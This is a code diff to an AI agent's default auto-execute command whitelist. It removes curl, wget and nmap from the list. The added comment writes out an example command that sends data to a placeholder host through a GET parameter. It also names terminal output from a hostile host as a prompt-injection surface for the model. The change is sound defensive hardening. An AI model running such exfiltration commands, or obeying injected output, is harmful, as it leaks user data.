@@ -87,7 +87,12 @@ export const DEFAULT_WHITELIST: string[] = [
     'dig', 'nslookup', 'host', 'whois',
     'ip', 'ifconfig', 'route',
     'netstat', 'ss', 'arp',
-    'curl', 'wget', 'nmap',
+    // NOTE: curl / wget / nmap are intentionally NOT whitelisted. They are
+    // network-egress / scanning tools — a plain GET (`curl https://host/?x=<data>`)
+    // exfiltrates data without tripping the write-method flag rules, so they must
+    // never auto-execute in auto-execute-safe mode (terminal output from a hostile
+    // host is fed to the model, a prompt-injection surface). The AI verdict / ask
+    // layer still permits them after explicit human review.
 
     // Version control (dangerous subcommands blocked structurally / via blacklist)
     'git',
